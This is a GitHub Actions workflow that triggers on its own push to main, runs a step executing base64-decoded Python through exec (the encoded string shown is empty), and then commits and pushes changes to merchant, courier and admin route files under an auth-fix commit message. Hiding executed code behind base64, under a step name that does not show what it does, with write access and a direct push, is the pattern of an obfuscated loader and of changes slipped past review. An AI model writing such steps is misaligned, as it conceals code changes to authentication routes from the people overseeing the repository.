name: One-shot workspace route guards

on:
  push:
    branches: [main]
    paths:
      - .github/workflows/workspace-route-guards.yml

permissions:
  contents: write

jobs:
  fix:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v5
      - name: Disable SSR for authenticated workspaces
        run: python -c "import base64;exec(base64.b64decode(''))"
      - name: Commit changes
        run: |
          if git diff --quiet -- src/routes/merchant.tsx src/routes/courier.tsx src/routes/admin.tsx; then
            echo "No changes required"
            exit 0
          fi
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/routes/merchant.tsx src/routes/courier.tsx src/routes/admin.tsx
          git commit -m "fix(auth): preserve workspace sessions on hard reload"
          git push
